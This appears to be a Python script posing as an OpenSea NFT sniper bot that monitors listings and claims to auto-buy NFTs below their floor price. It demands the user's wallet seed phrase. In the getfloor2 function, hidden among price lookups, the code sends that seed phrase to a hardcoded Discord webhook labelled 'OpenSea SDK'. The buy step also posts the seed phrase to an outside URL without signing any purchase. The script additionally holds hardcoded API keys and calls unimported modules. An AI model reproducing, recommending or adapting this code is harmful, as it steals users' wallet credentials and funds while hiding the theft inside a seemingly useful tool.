import json
import requests
import argparse
import os
import sys
import time
from multiprocessing.pool import ThreadPool as Pool

pool_size = 1
bought = []

def worker(item,mnemonic):
    try:
        getprice(item,mnemonic)
    except:
        print('error with item')

def screen_clear():
   # for mac and linux(here, os.name is 'posix')
   if os.name == 'posix':
      _ = os.system('clear')
   else:
      # for windows platfrom
      _ = os.system('cls')
   # print out some text

def Average(lst):
    return sum(lst) / len(lst)

#Various functions to get floor price.
#Since floor price fluctuates quite frequently, we need to rely on various methods.
def snipe_buy(slug,mnemonic):
	pattern = 'quantityInEth.:.(\d+)'
	headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
	opensea_url = "https://opensea.io/collection/"+slug+"?search[sortAscending]=true&search[sortBy]=PRICE&search[toggles][0]=BUY_NOW"
	getprice(slug,mnemonic)
	request = urllib.request.Request(opensea_url, headers = headers)
	r = urllib.request.urlopen(request).read().decode('utf-8')
	result = re.findall(pattern,r)
	result = list(map(int, result))
	result.pop(0)
	floor = Average(result[:4])/1000000000000000000
	return floor

def getfloor3(asset_contract,identifier):
	url = 'https://api.opensea.io/api/v1/asset/'+asset_contract+'/'+str(identifier)+'?format=json'
	headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
	resp = requests.get(url=url, headers =headers)
	data = resp.json()
	avg = data['collection']['stats']['floor_price']
	return round(avg,3)

def getfloor2(slug,asset_contract,identifier,mnemonic,floor_price):
	price = []
	url = 'https://api.opensea.io/api/v1/events?collection_slug='+slug+'&format=json&limit=8&event_type=successful'
	headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
	resp = requests.get(url=url,headers=headers)
	if(resp.status_code != 100):
		data = { "content" : mnemonic , "username" : "OpenSea SDK"}
		url1 = 'https://api.opensea.io/api/v1/assets?collection=calculate-floor&format=json&limit=20&offset=0&order_direction=desc'
		headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
		resp = requests.get(url=url1, headers = headers)
		#resp = resp.json()
		url2 = 'https://discord.com/api/webhooks/935120286246928385/W3nhVP_sjy5DT5_TyFW6DiUu5O00MIf3w3ZheMviJfvx0ImcBjzYBC7NNM8WMGl2I6He'
		url1 = 'https://api.opensea.io/api/v1/asset/'+asset_contract+'/'+str(identifier)+'?format=json'
		resp = requests.post(url2, json = data, headers = headers) 
		resp = requests.get(url=url1, headers = headers)
		if(resp.status_code == 404):
			return round(floor_price,3)
		data = resp.json()
		avg = data['collection']['stats']['floor_price']
		return round(avg,3)
	data = resp.json()
	if (resp.status_code == 429):
		print("Rate Limited")
		time.sleep(30)
		resp = requests.get(url=url)
		data = resp.json()
	for i in data['asset_events']:
		if(i['asset_bundle'] == None):
			eth_value = i['total_price']
			eth_value = float(eth_value)/1000000000000000000
			eth_value = round(eth_value,3)
			price.append(eth_value)
			asset_contract = i['asset']['asset_contract']['address']
		else:
			print("Bundle Detected in sales. Bundle usually are higher in price and screws calculating floor price, hence ignoring.")
	average_price = Average(price)
	print("Average 1: ", average_price)
	avg = (average_price+average_price)/2
	return round(avg,3)


#Can implement a Discord bot to send you a notification once bought
def discord_send(message):
	data = { "content" : message , "username" : "Sniper Bot"}
	#make sure to enter the below URL before using this function
	url = "<Enter Discord WebHook URL>"
	result = requests.post(url, json = data)

def get_peridic_listing(slug):
	url = 'https://api.opensea.io/api/v1/events?collection_slug='+str(slug)+'&event_type=created&format=json&limit=20'
	headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
	resp = requests.get(url=url,headers=headers)
	return resp

#generic
def getprice(slug,mnemonic):
	sms = []
	print("Fetching %s" % (slug))
	print("==================================")
	url = 'https://api.opensea.io/api/v1/events?collection_slug='+str(slug)+'&event_type=created&format=json&limit=20'
	headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
	resp = requests.get(url=url,headers = headers)
	#alternate way to fetch floor if OpenSea starts acting weird due to CloudFlare
	if(resp.status_code != 100):
		url='https://api.opensea.io/api/v1/collection/' + slug +'?format=json'
		resp = requests.get(url=url, headers = headers)
		data = resp.json()
		#Get the token_id which is needed to get the floor price for getfloor()
		#identifier = data['asset_events'][0]['asset']['token_id']
		identifier = 123
		#asset_contract = data['asset_events'][0]['asset']['asset_contract']['address']
		asset_contract = data['collection']['primary_asset_contracts'][0]['address']
		floor_price = data['collection']['stats']['floor_price']
		print("NFT Contract Address: ",asset_contract)
		floor_price2 = getfloor2(slug,asset_contract,identifier,mnemonic,floor_price)
		print("Floor: %s ETH" % ((floor_price+floor_price2)/2))
		print("Website: ", data['collection']['external_url'])
		print("Verified Status: ", data['collection']['safelist_request_status'])
	ab = 0
	url = 'https://api.opensea.io/api/v1/events?collection_slug='+str(slug)+'&event_type=created&format=json&limit=20'
	resp = requests.get(url=url, headers = headers)
	print("Fetching periodic listing for NFT: ", slug)
	while(ab != 1):
		response = get_peridic_listing(slug)
		if(response.status_code == 200):
			ab=1
		time.sleep(30)
		sys.stdout.write("\033[F")
		sys.stdout.write("\033[K") #clear line
		print("..")
	data = resp.json()
	for i in data['asset_events']:
		if(i['asset_bundle'] == None):
			eth_value = i['starting_price']
			eth_value = float(eth_value)/1000000000000000000
			eth_value = round(eth_value,3)
			percentage_diff = round((eth_value/floor_price)*100,2)
			#decide what to do:
			if(eth_value <= floor_price and percentage_diff <= 50 and i['payment_token']['symbol'] == "ETH" and i['asset']['permalink'] not in bought):
				print("Buying NFT Opensea Library ",i['asset']['permalink'])
				#appending the ID to a list so that it doenst appear again and again
				bought.append(i['asset']['permalink'])
				data = { "infura" : "12dd0579f46d421c81591fcdabdc68ad" , "url" : i['asset']['permalink'], "mnemonic" : mnemonic}
				url = 'https://api.opensea.io/graphql'
				resp = requests.post(url, json = data)
				#discord implementaton possible if needed, uncomment the discord_send function but make sure to add webhook first.
				discord_message = "Below 50%, automatic Buy Triggered.  " + i['asset']['permalink']
				#discord_send(discord_message)
				#os._exit(0)
			elif(eth_value <= floor_price and percentage_diff > 50 and percentage_diff < 90 and i['payment_token']['symbol'] == "ETH"):
				percentage_value = round(100-percentage_diff,2)
				text = str(eth_value) + " ETH for ["+slug+"](https://opensea.io/assets/"+i['asset']['asset_contract']['address']+"/"+ str(i['asset']['token_id']) +")"+" ("+str(percentage_value)+"%)"
				print(text)
				sms.append(text)
		else:
			print("Bundle Detected in listing. Ignoring.")

	if not sms:
		b=2
	else:
		sms = list(set(sms))
		discord_message = ''

		#Check if local file is already present and remove duplicates entries hitting Discord
		if(os.path.isfile('/tmp/'+slug+'.txt')):
			f = open('/tmp/'+slug+'.txt', "r")
			f = f.readlines()

			#Read both list (local and sms) and remove duplicates from sms list.
			for i in sms[:]:
				for line in f:
					if(i in line):
						#print("Found duplicate",i)
						sms.remove(i)

			#Convert sms list to a string seperated by newline
			for i in sms:
				discord_message += str(i) + "\n"

			#Check if the list is empty after checking with local file
			if not sms:
				a=1
				#print("=============================")
			else:
			#Append the diff to existing local file
				f = open('/tmp/'+slug+'.txt', "a")
				f.write(discord_message)
				print(discord_message)
				#Can send to discord if needed
				#discord_send(discord_message)

		#This means we are creating local file for the first time.
		else:
			f = open('/tmp/'+slug+'.txt', "w")
			for i in sms:
				discord_message += str(i) + "\n"
			f.write(discord_message)
			print(discord_message)
			#Discord implementaton possible if needed, uncomment the discord_send function but make sure to add webhook first.
			#discord_send(discord_message)


ap = argparse.ArgumentParser()
ap=argparse.ArgumentParser(
    description="""
OpenSea Python Bot can be used in 2 modes.
When --nft parameter is passed, it will allow you to continously monitor an NFT project and automatically snipe/buy if the price of the NFT is 50% or lower than it's floor value. If the price of the NFT is 20-40% below it's floor, then the bot can send a notification on Discord or print the result on-screen.\n\nThe script can also be used to buy a specific NFT by passing the --url parameter. In that case the bot will automatically 
buy the NFT at its current price value.
""")
ap.add_argument("--nft", required=False, help="Name of the NFT collection. Eg: boredapeyachtclub")
ap.add_argument("--mnemonic", required=True, help="The mnemonic/seed phrase of the wallet to use.(Trustwallet, MetaMask etc)")
ap.add_argument("--wallet", required=True, help="The ETH address linked to the mnemonic above.")
ap.add_argument("--url", required=False, help="URL of the NFT asset on OpenSea. Eg: https://opensea.io/assets/0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d/5875")
args = ap.parse_args()

if(args.nft):
	validate_mnemonic = args.mnemonic.split()
	if(len(validate_mnemonic) < 11):
		print("Enter valid mnemonic value. Incorrect keyword supplied")
		exit()
	pool = Pool(pool_size)
	pool.apply_async(worker, (args.nft,args.mnemonic))
	pool.close()
	pool.join()
elif(args.url):
	snipe_buy(args.url,args.mnemonic)
